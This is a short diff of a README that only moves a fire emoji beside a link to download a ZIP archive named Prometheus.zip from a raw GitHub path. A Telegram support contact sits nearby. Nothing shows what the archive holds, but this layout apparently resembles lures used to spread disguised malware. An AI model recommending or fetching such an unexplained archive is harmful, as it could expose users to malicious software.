@@ -21,7 +21,7 @@
     <br>
 </p>
 
-    🔥 <p align="center">[Download](https://raw.githubusercontent.com/tin-ka/Prometheus/main/Prometheus.zip) 🔥
+    <p align="center">🔥 [Download](https://raw.githubusercontent.com/tin-ka/Prometheus/main/Prometheus.zip) 🔥
   <br>
   💎 [Contact in Telegram](https://t.me/PrometheusSupport) 💎
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
